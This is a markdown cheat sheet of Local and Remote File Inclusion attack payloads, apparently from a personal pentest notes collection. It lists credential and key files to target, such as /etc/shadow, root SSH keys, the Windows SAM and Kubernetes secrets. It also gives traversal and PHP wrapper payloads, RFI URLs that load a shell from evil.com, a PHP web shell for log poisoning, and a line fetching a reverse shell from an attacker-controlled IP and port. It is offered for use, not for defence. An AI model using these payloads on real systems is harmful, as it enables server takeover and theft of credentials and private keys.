# LFI & RFI
### List
- UseFul LFI Files
	- LFI Payloads
- RFI Example
- Log Poisoning


# LFI
---
## Useful LFI files

### Linux
`/etc/passwd`
`/etc/shadow`
`/etc/issue`
`/etc/group`
`/etc/hostname`
`/etc/ssh/ssh_config`
`/etc/ssh/sshd_config`
`/root/.ssh/id_rsa`
`/root/.ssh/authorized_keys`
`/home/user/.ssh/authorized_keys`
`/home/user/.ssh/id_rsa`
`/proc/[0-9]*/fd/[0-9]*`
`/proc/mounts`
`/home/$USER/.bash_history`
`/home/$USER/.ssh/id_rsa`
`/var/run/secrets/kubernetes.io/serviceaccount`
`/var/lib/mlocate/mlocate.db`
`/var/lib/mlocate.db`


### Apache
`/etc/apache2/apache2.conf`
`/usr/local/etc/apache2/httpd.conf`
`/etc/httpd/conf/httpd.conf`
`Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log`
`Debian/Ubuntu -> /var/log/apache2/access.log`
`FreeBSD -> /var/log/httpd-access.log`
`/var/log/apache/access.log`
`/var/log/apache/error.log`
`/var/log/apache2/access.log`
`/var/log/apache/error.log`
`/etc/apache2/sites-available/00-default.conf`


### MySQL
`/var/lib/mysql/mysql/user.frm`
`/var/lib/mysql/mysql/user.MYD`
`/var/lib/mysql/mysql/user.MYI`


### Windows
`/boot.ini`
`/autoexec.bat`
`/windows/system32/drivers/etc/hosts`
`/windows/repair/SAM`
`/windows/panther/unattended.xml`
`/windows/panther/unattend/unattended.xml`
`/windows/system32/license.rtf`
`/windows/system32/eula.txt`


## LFI Payloads
---
### Directory traversal

```
?file=../../../../../../../etc/passwd
```

### PHP Wrapper php://file
```
?page=expect://ls
```

### PHP Wrapper php://filter
```
?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
```

```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
```

### some other useful payloads that i found online
```
http://example.com/index.php?page=etc/passwd
```

```
http://example.com/index.php?page=etc/passwd%00
```

```
http://example.com/index.php?page=../../etc/passwd
```

```
http://example.com/index.php?page=%252e%252e%252f
```

```
http://example.com/index.php?page=....//....//etc/passwd
```


# RFI
---
### Basic RFI
```
http://example.com/index.php?page=http://evil.com/shell.txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### RFI Wrapper EXPECT
```
http://example.com/index.php?page=php:expect://id
http://example.com/index.php?page=php:expect://ls
```

# Log Poisoning
---
### Basic  Log Poisoning

```php
<?php system($\_GET\['cmd'\]); \>>
```

```php
<?php file_put_contents('rev.php', file_get_contents('http://ip:port/rev.php')) ?>
```
\# note you should change ip and port in this one and you have to setup a HTTP server